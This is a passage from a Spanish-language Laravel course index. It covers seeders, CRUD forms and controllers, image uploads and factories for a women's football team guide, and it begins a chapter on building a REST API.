Bernab\u00e9u', 'ciudad' =&gt; 'Madrid', 'capacidad' =&gt; 81000],\n      ]);\n  }\n</code></pre> <ol> <li>En el archivo <code>DatabaseSeeder</code> llama tambi\u00e9n al seeder reci\u00e9n creado y en primer lugar:</li> </ol> <pre><code>&lt;?php\npublic function run()\n{\n    $this-&gt;call([\n        EstadiosSeeder::class, // Ojo, llamar en primer lugar\n        EquiposSeeder::class,\n    ]);\n}\n</code></pre> <ol> <li>Modifica el seeder <code>EquiposSeeder</code> para asginar equipos a estadios existentes:</li> </ol> <pre><code>&lt;?php\npublic function run()\n{\n    $estadio = Estadio::where('nombre', 'Camp Nou')-&gt;first();\n    $estadio-&gt;equipos()-&gt;create([\n        'nombre' =&gt; 'Bar\u00e7a Femenino',\n        'titulos' =&gt; 30,\n    ]);\n    $estadio = Estadio::where('nombre', 'Wanda Metropolitano')-&gt;first();\n    $estadio-&gt;equipos()-&gt;create([\n        'nombre' =&gt; 'Atl\u00e9tico de Madrid',\n        'titulos' =&gt; 10,\n    ]);\n    $estadio = Estadio::where('nombre', 'Santiago Bernab\u00e9u')-&gt;first();\n    $estadio-&gt;equipos()-&gt;create([\n        'nombre' =&gt; 'Real Madrid Femenino',\n        'titulos' =&gt; 5,\n    ]);\n}\n</code></pre> <ol> <li>Ejecuta los seeders para llenar las tablas <code>estadios</code> y <code>equipos</code>:</li> </ol> <pre><code>php artisan migrate:fresh --seed\n</code></pre> <ol> <li>Modifica la vista <code>equipos.index</code> para mostrar correctamente el estadio de cada equipo:</li> </ol> <pre><code>&lt;?php\n@foreach($equipos as $key =&gt; $equipo)\n    &lt;tr class=\"hover:bg-gray-100\"&gt;\n        &lt;td class=\"border border-gray-300 p-2\"&gt;\n            &lt;a href=\"{{ route('equipos.show', $equipo-&gt;id) }}\" class=\"text-blue-700 hover:underline\"&gt;{{ $equipo-&gt;nombre }}&lt;/a&gt;\n        &lt;/td&gt;\n        &lt;td class=\"border border-gray-300 p-2\"&gt;{{ $equipo-&gt;estadio-&gt;nombre }}&lt;/td&gt;\n        &lt;td class=\"border border-gray-300 p-2\"&gt;{{ $equipo-&gt;titulos }}&lt;/td&gt;\n    &lt;/tr&gt;\n@endforeach\n</code></pre> <ol> <li>Crea la vista <code>equipos.create</code> con el formulario para crear un equipo que incluya una lista desplegable con los estadios disponibles:</li> </ol> <pre><code>@extends('layouts.app')\n@section('title', \"Gu\u00eda de equipos\")\n@section('content')\n&lt;form action=\"{{ route('equipos.store') }}\" method=\"POST\" class=\"bg-white p-6 rounded-lg shadow-md max-w-md mx-auto\"&gt;\n    @csrf\n    &lt;div class=\"mb-4\"&gt;\n        &lt;label for=\"nombre\" class=\"block text-sm font-medium text-gray-700 mb-1\"&gt;Nombre:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"nombre\" id=\"nombre\" required\n            class=\"w-full border-gray-300 rounded-lg shadow-sm focus:ring-blue-500 focus:border-blue-500\"&gt;\n    &lt;/div&gt;\n\n    &lt;div class=\"mb-4\"&gt;\n        &lt;label for=\"titulos\" class=\"block text-sm font-medium text-gray-700 mb-1\"&gt;T\u00edtulos:&lt;/label&gt;\n        &lt;input type=\"number\" name=\"titulos\" id=\"titulos\" required\n            class=\"w-full border-gray-300 rounded-lg shadow-sm focus:ring-blue-500 focus:border-blue-500\"&gt;\n    &lt;/div&gt;\n\n    &lt;div class=\"mb-4\"&gt;\n        &lt;label for=\"estadio_id\" class=\"block text-sm font-medium text-gray-700 mb-1\"&gt;Estadio:&lt;/label&gt;\n        &lt;select name=\"estadio_id\" id=\"estadio_id\" required\n            class=\"w-full border-gray-300 rounded-lg shadow-sm focus:ring-blue-500 focus:border-blue-500\"&gt;\n            @foreach ($estadios as $estadio)\n                &lt;option value=\"{{ $estadio-&gt;id }}\"&gt;{{ $estadio-&gt;nombre }}&lt;/option&gt;\n            @endforeach\n        &lt;/select&gt;\n    &lt;/div&gt;\n\n    &lt;button type=\"submit\"\n        class=\"w-full bg-blue-500 text-white font-medium py-2 px-4 rounded-lg shadow hover:bg-blue-600 focus:ring focus:ring-blue-300\"&gt;\n        Crear Equipo\n    &lt;/button&gt;\n&lt;/form&gt;\n@endsection \n</code></pre> <ol> <li>En la vista <code>equipos.index</code> incluir justo despu\u00e9s de la tabla un bot\u00f3n que vaya a la ruta anterior:</li> </ol> <pre><code>&lt;p class=\"mt-10 text-center\"&gt;\n    &lt;a href=\"/equipos/create\" class=\"bg-blue-700 hover:bg-blue-500 text-white font-bold py-2 px-4 rounded-full\"&gt;Crear equipo&lt;/a&gt;\n&lt;/p&gt;\n</code></pre> <ol> <li>En el controlador <code>EquipoController</code> modificar la funci\u00f3n <code>create</code> para recuperar y pasar a la vista los estadios. Y tambi\u00e9n la funci\u00f3n <code>store</code> para recibir los datos del formulario y crear el equipo:</li> </ol> <pre><code>&lt;?php\npublic function create() {\n    $estadios = Estadio::all();\n    return view('equipos.create', compact('estadios'));\n}\n\npublic function store(Request $request){\n    $validated = $request-&gt;validate([\n        'nombre' =&gt; 'required|unique:equipos',\n        'titulos' =&gt; 'integer|min:0',\n        'estadio_id' =&gt; 'required|exists:estadios,id',\n    ]);\n    Equipo::create($validated);\n    return redirect()-&gt;route('equipos.index')-&gt;with('mensaje', 'Equipo creado correctamente!');\n}\n</code></pre> <ol> <li>Para que la asignaci\u00f3n m\u00e1siva funcione, en el modelo <code>Equipo</code> hay que modificar el atributo <code>$fillable</code> cambiando el antiguo string <code>estadio</code> por el nuevo <code>estadio_id</code>:</li> </ol> <pre><code>&lt;?php\nprotected $fillable = ['nombre', 'estadio_id', 'titulos'];\n</code></pre> <ol> <li>Crea la vista <code>equipos.edit</code> con el formulario para editar un equipo que incluya una lista desplegable con los estadios disponibles:</li> </ol> <pre><code>@extends('layouts.app')\n@section('title', \"Gu\u00eda de equipos\")\n@section('content')\n&lt;form action=\"{{ route('equipos.update', $equipo-&gt;id) }}\" method=\"POST\" class=\"bg-white p-6 rounded-lg shadow-md max-w-md mx-auto\"&gt;\n    @csrf\n    @method('PUT')\n\n    &lt;div class=\"mb-4\"&gt;\n        &lt;label for=\"nombre\" class=\"block text-sm font-medium text-gray-700 mb-1\"&gt;Nombre:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"nombre\" id=\"nombre\" value=\"{{ old('nombre', $equipo-&gt;nombre) }}\" required\n            class=\"w-full border-gray-300 rounded-lg shadow-sm focus:ring-blue-500 focus:border-blue-500 \n            @error('nombre') border-red-500 @enderror\" /&gt;\n        @error('nombre')\n            &lt;p class=\"text-red-500 text-sm mt-1\"&gt;{{ $message }}&lt;/p&gt;\n        @enderror\n    &lt;/div&gt;\n\n    &lt;div class=\"mb-4\"&gt;\n        &lt;label for=\"titulos\" class=\"block text-sm font-medium text-gray-700 mb-1\"&gt;T\u00edtulos:&lt;/label&gt;\n        &lt;input type=\"number\" name=\"titulos\" id=\"titulos\" value=\"{{ old('titulos', $equipo-&gt;titulos) }}\" required\n            class=\"w-full border-gray-300 rounded-lg shadow-sm focus:ring-blue-500 focus:border-blue-500 \n            @error('titulos') border-red-500 @enderror\" /&gt;\n        @error('titulos')\n            &lt;p class=\"text-red-500 text-sm mt-1\"&gt;{{ $message }}&lt;/p&gt;\n        @enderror\n    &lt;/div&gt;\n\n    &lt;div class=\"mb-4\"&gt;\n        &lt;label for=\"estadio_id\" class=\"block text-sm font-medium text-gray-700 mb-1\"&gt;Estadio:&lt;/label&gt;\n        &lt;select name=\"estadio_id\" id=\"estadio_id\" required\n            class=\"w-full border-gray-300 rounded-lg shadow-sm focus:ring-blue-500 focus:border-blue-500 \n            @error('estadio_id') border-red-500 @enderror\"&gt;\n            @foreach ($estadios as $estadio)\n                &lt;option value=\"{{ $estadio-&gt;id }}\" {{ $estadio-&gt;id == $equipo-&gt;estadio_id ? 'selected' : '' }}&gt;\n                    {{ $estadio-&gt;nombre }}\n                &lt;/option&gt;\n            @endforeach\n        &lt;/select&gt;\n        @error('estadio_id')\n            &lt;p class=\"text-red-500 text-sm mt-1\"&gt;{{ $message }}&lt;/p&gt;\n        @enderror\n    &lt;/div&gt;\n\n    &lt;button type=\"submit\"\n        class=\"w-full bg-blue-500 text-white font-medium py-2 px-4 rounded-lg shadow hover:bg-blue-600 focus:ring focus:ring-blue-300\"&gt;\n        Actualizar Equipo\n    &lt;/button&gt;\n&lt;/form&gt;\n@endsection \n</code></pre> <ol> <li>A\u00f1ade en la vista <code>equipos.index</code> los enlaces para eliminar un equipo y mostrar el formulario de actualizar anterior. Algo as\u00ed:</li> </ol> <pre><code>&lt;td class=\"border border-gray-300 p-2 text-center\"&gt;\n    &lt;a href=\"{{ route('equipos.edit', $equipo-&gt;id) }}\" class=\"text-blue-700 hover:underline\"&gt;\ud83d\udcdd&lt;/a&gt;\n    &lt;form action=\"{{ route('equipos.destroy', $equipo-&gt;id) }}\" method=\"POST\" class=\"inline\"&gt;\n        @csrf\n        @method('DELETE')\n        &lt;button type=\"submit\" class=\"text-red-700 hover:underline\"&gt;\u274c&lt;/button&gt;\n    &lt;/form&gt;\n&lt;/td&gt;\n</code></pre> <ol> <li>En el controlador <code>EquipoController</code> modificar la funci\u00f3n <code>edit</code> para recuperar y pasar a la vista los estadios. Y tambi\u00e9n la funci\u00f3n <code>update</code> para recibir los datos del formulario y actualizar el equipo:</li> </ol> <pre><code>&lt;?php\n  public function edit($id) {\n      $equipo = Equipo::find($id);\n      $estadios = Estadio::all();\n      return view('equipos.edit', compact('equipo', 'estadios'));\n  }\n\n  public function update(Request $request, $id){\n      $validated = $request-&gt;validate([\n          'nombre' =&gt; 'required|unique:equipos,nombre,'.$id,\n          'titulos' =&gt; 'integer|min:0',\n          'estadio_id' =&gt; 'required|exists:estadios,id',\n      ]);\n      $equipo = Equipo::findOrFail($id);\n      $equipo-&gt;update($validated);\n      return redirect()-&gt;route('equipos.index')-&gt;with('mensaje', 'Equipo actualizado correctamente!');\n  }\n\n  public function destroy($id) {\n      $equipo = Equipo::find($id);\n      $equipo-&gt;delete();\n      return redirect()-&gt;route('equipos.index')-&gt;with('mensaje', 'Equipo eliminado correctamente!');\n  }\n</code></pre> <ol> <li>En la vista <code>equipos.index</code> podemos mejorar la experiencia de usuario a\u00f1adiendo un \"Toast\" propio en el que se muestren los mensajes de confirmaci\u00f3n cuando se a\u00f1aden, modifican o eliminan equipos. Justo antes de la tabla de equipos, a\u00f1ade:</li> </ol> <pre><code>@if (session('mensaje'))\n&lt;div id='toast' class=\"fixed bottom-5 right-5 flex items-center bg-green-600 text-white text-sm font-semibold px-6 py-3 rounded-lg shadow-lg animate-slide-in\"&gt;\n    &lt;svg class=\"w-5 h-5 mr-2\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" viewBox=\"0 0 24 24\" xmlns=\"http://www.w3.org/2000/svg\"&gt;\n        &lt;path stroke-linecap=\"round\" stroke-linejoin=\"round\" d=\"M5 13l4 4L19 7\"&gt;&lt;/path&gt;\n    &lt;/svg&gt;\n    {{ session('mensaje') }}\n&lt;/div&gt;\n\n&lt;!-- Script para desaparecer el toast despu\u00e9s de 3 segundos --&gt;\n&lt;script&gt;\n    setTimeout(() =&gt; {\n        document.getElementById('toast').classList.add('opacity-0');\n        setTimeout(() =&gt; document.getElementById('toast').remove(), 500);\n    }, 3000); \n&lt;/script&gt;\n@endif\n</code></pre>"},{"location":"09laravelAvanzado.html#paso-5-anadir-un-escudo-al-equipo","title":"Paso 5: A\u00f1adir un escudo al equipo","text":"<p>A continuaci\u00f3n vas a realizar los pasos necesarios para poder subir una imagen como escudo de cada equipo.</p> <ol> <li>Crea la migraci\u00f3n para a\u00f1adir el campo <code>escudo</code> a la tabla <code>equipos</code>:</li> </ol> <pre><code>php artisan make:migraton add_escudo_to_equipos_table\n</code></pre> <ol> <li>En el archivo de migraci\u00f3n creado, a\u00f1ade el campo <code>escudo</code>:</li> </ol> <pre><code>&lt;?php\npublic function up()\n{\n    Schema::table('equipos', function (Blueprint $table) {\n        $table-&gt;string('escudo')-&gt;nullable();\n    });\n}\npublic function down()\n{\n    Schema::table('equipos', function (Blueprint $table) {\n        $table-&gt;dropColumn('escudo');\n    });\n}\n</code></pre> <ol> <li>Ejecutar la migraci\u00f3n:</li> </ol> <pre><code>php artisan migrate\n</code></pre> <ol> <li>Modifica el modelo <code>Equipo</code> para a\u00f1adir el campo <code>escudo</code> a <code>$fillable</code>:</li> </ol> <pre><code>&lt;?php\nprotected $fillable = ['nombre', 'estadio_id', 'titulos', 'escudo'];\n</code></pre> <ol> <li>Modifica la vista <code>equipos.create</code> para incluir un campo de archivo para subir el escudo del equipo:</li> </ol> <pre><code>&lt;div class=\"mb-4\"&gt;\n    &lt;label for=\"escudo\" class=\"block text-sm font-medium text-gray-700 mb-1\"&gt;Escudo:&lt;/label&gt;\n    &lt;input type=\"file\" name=\"escudo\" id=\"escudo\"\n        class=\"w-full border-gray-300 rounded-lg shadow-sm focus:ring-blue-500 focus:border-blue-500\"&gt;\n&lt;/div&gt;\n</code></pre> <ol> <li>Modifica la vista <code>equipos.edit</code> para incluir un campo de archivo para actualizar el escudo del equipo:</li> </ol> <pre><code>&lt;div class=\"mb-4\"&gt;\n    &lt;label for=\"escudo\" class=\"block text-sm font-medium text-gray-700 mb-1\"&gt;Escudo:&lt;/label&gt;\n    &lt;input type=\"file\" name=\"escudo\" id=\"escudo\" \n        class=\"w-full border-gray-300 rounded-lg shadow-sm focus:ring-blue-500 focus:border-blue-500\"&gt;\n    @if ($equipo-&gt;escudo)\n        &lt;p class=\"mt-2 text-sm text-gray-500\"&gt;Escudo actual:&lt;/p&gt;\n        &lt;img src=\"{{ asset('storage/' . $equipo-&gt;escudo) }}\" alt=\"Escudo de {{ $equipo-&gt;nombre }}\" class=\"h-16 mt-2\"&gt;\n    @endif\n&lt;/div&gt;\n</code></pre> <ol> <li>A\u00f1ade <code>enctype=\"multipart/form-data\"</code> a los dos formularios:</li> </ol> <pre><code>&lt;form action=\"{{ route('equipos.store') }}\" method=\"POST\" enctype=\"multipart/form-data\" class=\"bg-white p-6 rounded-lg shadow-md max-w-md mx-auto\"&gt;\n\n&lt;form action=\"{{ route('equipos.update', $equipo-&gt;id) }}\" method=\"POST\" enctype=\"multipart/form-data\" class=\"bg-white p-6 rounded-lg shadow-md max-w-md mx-auto\"&gt;\n</code></pre> <ol> <li>Para acceder a archivos desde el navegador mediante su ruta y poder incluirlos en las vistas, es necesario crear un enlace simb\u00f3lico en <code>/public</code> que apunte a <code>/storage/app/public</code> (o donde mande el disco configurado). Ejecuta:</li> </ol> <pre><code>php artisan storage:link\n</code></pre> <ol> <li>Actualiza el m\u00e9todo <code>store</code> del controlador para guardar la imagen del escudo  en el subdirectorio <code>escudos</code> en el disco p\u00fablico <code>/storage/app/public</code>:</li> </ol> <pre><code>&lt;?php\npublic function store(Request $request){\n    $validated = $request-&gt;validate([\n        'nombre' =&gt; 'required|unique:equipos',\n        'titulos' =&gt; 'integer|min:0',\n        'estadio_id' =&gt; 'required|exists:estadios,id',\n        'escudo' =&gt; 'nullable|image|mimes:jpeg,png,jpg|max:2048', // Validaci\u00f3n del fichero\n    ]);\n\n    if ($request-&gt;hasFile('escudo')) {\n        $path = $request-&gt;file('escudo')-&gt;store('escudos', 'public'); // Guardar en directorio 'escudos' en disco 'public'\n        $validated['escudo'] = $path;\n    }\n\n    Equipo::create($validated);\n    return redirect()-&gt;route('equipos.index')-&gt;with('mensaje', 'Equipo creado correctamente!');\n}\n</code></pre> <ol> <li>Actualiza el m\u00e9todo <code>update</code> del controlador para actualizar la imagen del escudo en el subdirectorio <code>escudos</code> en el disco p\u00fablico <code>/storage/app/public</code> eliminando el fichero anterior si existiera:</li> </ol> <pre><code>&lt;?php\npublic function update(Request $request, $id){\n    $validated = $request-&gt;validate([\n        'nombre' =&gt; 'required|unique:equipos,nombre,'.$id,\n        'titulos' =&gt; 'integer|min:0',\n        'estadio_id' =&gt; 'required|exists:estadios,id',\n        'escudo' =&gt; 'nullable|image|mimes:jpeg,png,jpg|max:2048', // Validaci\u00f3n del fichero\n    ]);\n\n    $equipo = Equipo::findOrFail($id);\n\n    if ($request-&gt;hasFile('escudo')) {\n        if ($equipo-&gt;escudo) {\n            Storage::disk('public')-&gt;delete($equipo-&gt;escudo); // Borra el fichero anterior si lo tuviera\n        }\n        $path = $request-&gt;file('escudo')-&gt;store('escudos', 'public'); // Guardar en directorio 'escudos' en disco 'public'\n        $validated['escudo'] = $path;\n    }\n\n    $equipo-&gt;update($validated);\n    return redirect()-&gt;route('equipos.index')-&gt;with('mensaje', 'Equipo actualizado correctamente!');\n}\n</code></pre> <ol> <li>Actualiza el m\u00e9todo <code>destroy</code> para eliminar tambi\u00e9n de disco el escudo:</li> </ol> <pre><code>&lt;?php\npublic function destroy($id) {\n    $equipo = Equipo::find($id);\n    if ($equipo-&gt;escudo) {\n        Storage::disk('public')-&gt;delete($equipo-&gt;escudo);\n    }\n    $equipo-&gt;delete();\n    return redirect()-&gt;route('equipos.index')-&gt;with('mensaje', 'Equipo eliminado correctamente!');\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#paso-6-mostrar-el-escudo-del-equipo-en-la-vista-en-detalle","title":"Paso 6: Mostrar el escudo del equipo en la vista en detalle","text":"<p>Para mostrar la imagen del escudo en la vista en detalle del equipo hay que modificar el componente de la vista <code>Equipo</code> que se cre\u00f3 en su d\u00eda. Tambi\u00e9n se podr\u00eda haber mostrado directamente en la vista sin necesidad de crear el componente. Paso a paso, realiza las siguientes acciones.</p> <ol> <li>En el controlador <code>EquipoController</code> modfica la funci\u00f3n <code>show</code> para pasar el nombre del estadio:</li> </ol> <pre><code>&lt;?php\npublic function show($id) {\n    $equipo = Equipo::find($id);\n    $estadio = $equipo-&gt;estadio-&gt;nombre;\n    return view('equipos.show', compact('equipo', 'estadio'));\n}\n</code></pre> <ol> <li>Modifica el componente de la vista <code>equipos.show</code> para mostrar la imagen del escudo del equipo. En el caso de que un equipo no tenga escudo (null), se le pasa la cadena vac\u00eda '' para que se construya bien el componente porque requiere string y fallar\u00eda con null:</li> </ol> <pre><code>&lt;x-equipo\n   :nombre=\"$equipo['nombre']\"\n   :estadio=\"$estadio\"\n   :titulos=\"$equipo['titulos']\"\n   :escudo=\"$equipo['escudo'] ?? ''\" \n/&gt;\n</code></pre> <p>Otra opci\u00f3n hubiera sido poner una imagen de escudo por defecto, quedando esa l\u00ednea as\u00ed: <code>:escudo=\"$equipo['escudo'] ?? 'escudos/default.png'\"</code>.</p> <ol> <li>En el constructor del componente de la vista <code>Equipo</code>, a\u00f1adir el campo escudo. Est\u00e1 en <code>app/View/Components/Equipo.php</code>:</li> </ol> <pre><code>&lt;?php\npublic function __construct(\n    public string $nombre,\n    public string $estadio,\n    public int $titulos,\n    public string $escudo ) { }\n</code></pre> <ol> <li>En la vista del componente de la vista <code>Equipo</code>, a\u00f1adir la imagen. Est\u00e1 en <code>resources/views/components/equipo.blade.php</code>:</li> </ol> <pre><code>&lt;div class=\"equipo border rounded-lg shadow-md p-4 bg-white\"&gt;\n    @if ($escudo)\n       &lt;p&gt;\n            &lt;img src=\"{{ asset('storage/' . $escudo) }}\" alt=\"Escudo de {{ $nombre }}\" class=\"h-8 w-8 object-cover rounded-full\"&gt;\n        &lt;/p&gt;\n    @endif\n    &lt;h2 class=\"text-xl font-bold text-blue-800\"&gt;{{ $nombre }}&lt;/h2&gt;\n    &lt;p&gt;&lt;strong&gt;Estadio:&lt;/strong&gt; {{ $estadio }}&lt;/p&gt;\n    &lt;p&gt;&lt;strong&gt;T\u00edtulos:&lt;/strong&gt; {{ $titulos }}&lt;/p&gt;\n&lt;/div&gt;\n</code></pre>"},{"location":"09laravelAvanzado.html#paso-7-utilizar-factorias-para-datos-de-ejemplo","title":"Paso 7: Utilizar factor\u00edas para datos de ejemplo","text":"<ol> <li>Crea una factor\u00eda para el modelo <code>Estadio</code>:</li> </ol> <pre><code>php artisan make:factory EstadioFactory --model=Estadio\n</code></pre> <ol> <li>Modifica la factor\u00eda para crear datos aleatorios:</li> </ol> <pre><code>&lt;?php\npublic function definition(): array\n{\n    return [\n        'nombre' =&gt; fake()-&gt;unique()-&gt;city.' Stadium',\n        'ciudad' =&gt; fake()-&gt;unique()-&gt;city,\n        'capacidad' =&gt; fake()-&gt;numberBetween(10000, 100000),\n    ];\n}\n</code></pre> <ol> <li>Actualiza el seeder <code>EstadiosSeeder</code> para utilizar la factor\u00eda:</li> </ol> <pre><code>&lt;?php\npublic function run()\n{\n    //...\n    Estadio::factory()-&gt;count(5)-&gt;create();\n}\n</code></pre> <ol> <li>Modifica el modelo <code>Estadio</code> para permitir factor\u00edas:</li> </ol> <pre><code>&lt;?php\nuse Illuminate\\Database\\Eloquent\\Factories\\HasFactory;\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Estadio extends Model\n{\n    use HasFactory;\n    // ...\n}\n</code></pre> <ol> <li>Repetimos el proceso, ahora para <code>Equipo</code>. Crea su factor\u00eda:</li> </ol> <pre><code>php artisan make:factory EquipoFactory --model=Equipo\n</code></pre> <ol> <li>Modifica la factor\u00eda para crear datos aleatorios:</li> </ol> <pre><code>&lt;?php\npublic function definition(): array\n{\n    return [\n        'nombre' =&gt; fake()-&gt;unique()-&gt;company,\n        'titulos' =&gt; fake()-&gt;numberBetween(0, 50),\n        'estadio_id' =&gt; \\App\\Models\\Estadio::factory(), // Crea un estadio mediante su factor\u00eda\n        'escudo' =&gt; 'escudos/default.png', // Imagen por defecto\n      ];\n}\n</code></pre> <p>Atenci\u00f3n</p> <p>Al llamar a la factor\u00eda de <code>Estadio</code> en el punto anterior, ya no es necesario llamar llamar en <code>DatabaseSeeder</code> al seeder <code>EstadiosSeeder</code> que a su vez llama a la factor\u00eda. Directamente se crear\u00edan los estadios al llamar al seeder <code>EquiposSeeder</code> siguiente.</p> <ol> <li>Actualiza el seeder <code>EquiposSeeder</code> para utilizar la factor\u00eda:</li> </ol> <pre><code>&lt;?php\npublic function run()\n{\n    //...\n    Equipo::factory()-&gt;count(10)-&gt;create();\n}\n</code></pre> <ol> <li>Modifica el modelo <code>Equipo</code> para permitir factor\u00edas:</li> </ol> <pre><code>&lt;?php\nuse Illuminate\\Database\\Eloquent\\Factories\\HasFactory;\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Equipo extends Model\n{\n    use HasFactory;\n    // ...\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#resultado-de-la-aplicacion","title":"Resultado de la aplicaci\u00f3n","text":"Ejemplo de navegaci\u00f3n por la app"},{"location":"09laravelAvanzado.html#practica-guia-de-estadios-de-futbol","title":"Pr\u00e1ctica: Gu\u00eda de estadios de f\u00fatbol","text":"<p>El objetivo de esta pr\u00e1ctica es crear una extensi\u00f3n de la gu\u00eda de equipos de f\u00fatbol femenino para incluir la funcionalidad de estadios, jugadoras y partidos.</p> <p>Pasos a Seguir:</p> <ol> <li>Completa el CRUD de estadios</li> </ol> <ul> <li>A\u00f1ade los m\u00e9todos create, store, edit, update y destroy al controlador <code>EstadioController</code>.</li> <li>Modifica las vistas para la gesti\u00f3n del estadio (index, show, create, edit).</li> <li>Modifica el componente de estadio para mostrar los equipos que juegan.</li> </ul> <ol> <li>Jugadoras y partidos: Crear Migraciones y Modelos</li> </ol> <ul> <li>Genera una migraci\u00f3n para las jugadoras, asoci\u00e1ndolas con un equipo y con la posibilidad de poner una foto cada una.</li> <li>A\u00f1ade una migraci\u00f3n para la tabla partidos, incluyendo equipos locales y visitantes, fecha del partido y resultado.</li> <li>Ejecuta todas las migraciones.</li> </ul> <ol> <li>Seeders y Factor\u00edas</li> </ol> <ul> <li>Crea seeders para las tablas jugadoras y partidos.</li> <li>Usa factor\u00edas para generar datos de ejemplo para jugadoras y partidos.</li> </ul> <ol> <li>Modelos y Relaciones</li> </ol> <p>Define las relaciones en los modelos:</p> <ul> <li>Un equipo tiene muchas jugadoras.</li> <li>Un equipo puede tener muchos partidos como local o visitante.</li> <li>Un partido tiene un equipo local y un equipo visitante.</li> <li>Define las relaciones inversas y ajusta las configuraciones seg\u00fan sus necesidades.</li> </ul> <ol> <li>Implementa las funcionalidades CRUD de jugadoras y partidos</li> </ol> <ul> <li>Implementa formularios para crear y editar jugadoras y partidos.</li> <li>Aseg\u00farate de que los campos est\u00e9n correctamente validados antes de guardar los datos.</li> <li>Cada jugador puede o no tener una foto.</li> </ul> <ol> <li>Vistas y Componentes</li> </ol> <ul> <li>Modifica el componente de equipos para mostrar a las jugadoras.</li> </ul>"},{"location":"09laravelAvanzado.html#preguntas-para-reflexionar","title":"Preguntas para reflexionar","text":"<ol> <li>Migraciones: \u00bfQu\u00e9 ventajas tiene utilizar migraciones para gestionar el esquema de la base de datos?</li> <li>Relaciones: \u00bfC\u00f3mo gestionar\u00edas las relaciones many-to-many (por ejemplo, entre equipos y partidos)?</li> <li>Blade y Componentes: \u00bfQu\u00e9 beneficios aporta el uso de componentes Blade en formularios complejos?</li> </ol>"},{"location":"10apiREST.html","title":"10apiREST","text":""},{"location":"10apiREST.html#servicios-rest","title":"Servicios REST","text":"<p>Duraci\u00f3n estimada: 32 sesiones</p>"},{"location":"10apiREST.html#api","title":"API","text":"<p>Una API (Application Programming Interface) es un conjunto de funciones y procedimientos por los cuales, una aplicaci\u00f3n externa accede a los datos, a modo de biblioteca como una capa de abstracci\u00f3n y la API se encarga de enviar el dato solicitado.</p> <p>Una de las caracter\u00edsticas fundamentales de las API es que son Sateless, lo que quiere decir que las peticiones se hacen y desaparecen, no hay usuarios logueados ni datos que se quedan almacenados.</p> <p>Ejemplos de APIs gratuitas:</p> <ul> <li>ChuckNorris IO</li> <li>OMDB</li> <li>PokeAPI - Pokemon</li> <li>RAWg - Videojuegos</li> <li>The Star Wars API</li> </ul> <p>Para hacer pruebas con estas APIs podemos implementar el c\u00f3digo para consumirlas o utilizar un cliente especial para el consumo de estos servicios.</p> <ul> <li>PostMan</li> <li>Thunder Client</li> <li>Insomnia</li> <li>Advance REST Client (desde el navegador)</li> </ul>"},{"location":"10apiREST.html#rest","title":"REST","text":"<p>Con esta metodolog\u00eda llamada REST vamos a poder construir APIs para que desde un cliente externo se puedan consumir.</p> <p>Gracias a este standard de la arquitectura del software vamos a poder montar un API que utilice los m\u00e9todos standard GET, POST, PUT y DELETE.</p>"},{"location":"10apiREST.html#creando-recurso-resource","title":"Creando Recurso (Resource)","text":"<p>Para crear un recurso dentro de nuestra aplicaci\u00f3n hecha con Laravel, necesitamos crear un controlador del tipo resource donde establezcamos los m\u00e9todos que nosotros queramos realizar a la hora de trabajar con los datos</p> <pre><code>php artisan make:controller ChollosController --resource\n</code></pre> <p>Artisan nos crear\u00e1 un nuevo controlador en la carpeta <code>controllers</code> con el nombre <code>ChollosController</code> o el nombre que le hayamos pasado.</p> <p>La estructura de este archivo es un poco diferente a los controladores que ya hemos visto anteriormente. Ahora tenemos los siguientes m\u00e9todos creados de manera autom\u00e1tica:</p> <ul> <li><code>index()</code> normalmente para listar, en nuestro caso los chollos</li> <li><code>create()</code> para crear plantillas (no lo vamos a usar)</li> <li><code>store()</code> para guardar los datos que pasemos a la API</li> <li><code>update()</code> para actualizar un dato ya existente en la BDD</li> <li><code>delete()</code> para eliminar un dato ya existente en la BDD</li> </ul> <p>En el caso de devolver un listado con todos los chollos, lo primero que debemos hacer es importar nuestro modelo Chollo.</p> <pre><code>&lt;?php\n\nuse App\\Models\\Chollo;\n</code></pre> <p>Y como hemos ido haciendo en controladores anteriores, necesitamos hacer la consulta apropiada para devolver todos los chollos. CUIDADO CON EL RETURN porque ahora no estamos devolviendo una vista sino un array de datos en formato JSON.</p> <pre><code>&lt;?php\n\npublic function index()\n{\n    $chollos = Chollo::all();\n    return $chollos;\n}\n</code></pre> <p>El \u00faltimo paso ser\u00eda configurar el archivo de rutas, pero en este caso el archivo de rutas de la api se llama <code>api.php</code></p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 api.php \n\nuse App\\Http\\Controllers\\ChollosController;\nuse Illuminate\\Http\\Request;\nuse Illuminate\\Support\\Facades\\Route;\n\nRoute::get('/chollos', [ ChollosController::class, 'index' ]);\n</code></pre> <p>Una vez hecho \u00e9sto, debemos poner en marcha nuestro servidor.</p> <pre><code>php artisan serve\n</code></pre> <p>Ahora ya podemos usar el Postman o cualquier cliente de la misma \u00edndole para testear nuestra API a trav\u00e9s de la URL de nuestro servidor <code>http://127.0.0.1:8000/api/chollos</code></p>"},{"location":"10apiREST.html#recuperando-datos-en-vista-blade","title":"Recuperando datos en vista BLADE","text":"<p>Ya tenemos nuestra API montada y puede ser consumida a trav\u00e9s del navegador o cualquier cliente como <code>PostMan</code> o <code>Thunder Client</code> pero lo que nos interesa ahora es poder listar la informaci\u00f3n en una vista como hac\u00edamos en el tema anterior.</p> <p>Lo que vamos a tener que hacer es lo siguiente</p> <ul> <li>Modificar el <code>Controlador</code> para que consuma de la API</li> <li>Convertir el tipo de dato que nos devuelve la API como respuesta</li> <li>Utilizar una estructura de control <code>forEach</code> dentro de nuestra vista</li> <li>Acceder a cada clave del objeto JSON recibido en la vista <code>blade</code></li> </ul> <p>Vamos a modificar el controlador para que consuma de la API y convertimos los datos con el m\u00e9todo <code>collect()</code>.</p> <p>Para la llamada debemos importar <code>Http</code>.</p> <pre><code>&lt;?php\n\n// estamos en \u2593\u2593\u2593 CholloController.php\n\nuse App\\Models\\Chollo; // EN CASO DE API LOCAL\nuse Illuminate\\Support\\Facades\\Http; // INDISPENSABLE EN CASO DE API EXTERNA\n\nclass RestController extends Controller\n{\n    public function index() {\n        // $restChollos = Http::get('http://localhost/api/chollos') -&gt; collect(); // PARA API EXTERNA\n\n        $chollos = 